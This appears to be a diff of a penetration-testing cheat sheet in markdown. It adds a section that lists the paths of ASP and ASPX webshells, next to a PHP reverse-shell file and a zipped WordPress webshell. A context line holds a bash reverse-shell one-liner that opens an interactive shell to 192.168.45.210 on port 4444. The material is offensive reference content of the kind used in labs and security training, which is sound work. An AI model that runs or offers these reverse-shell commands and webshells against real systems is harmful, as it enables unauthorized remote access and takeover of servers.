@@ -452,11 +452,17 @@ zip wordpress-webshell.zip wordpress-webshell.php
 /bin/bash -c 'bash -i >& /dev/tcp/192.168.45.210/4444 0>&1'
 ~~~
 
-
 ## PHP ReverseShell
 ~~~ shell
 /usr/share/webshells/php/php-reverse-shell.php
 ~~~
+
+## ASP, ASPX ReverseShell
+~~~ shell
+/usr/share/webshells/asp/cmdasp.asp
+/usr/share/webshells/aspx/cmdasp.aspx
+~~~
+
 
 ## PowerShell
 ~~~ powershell
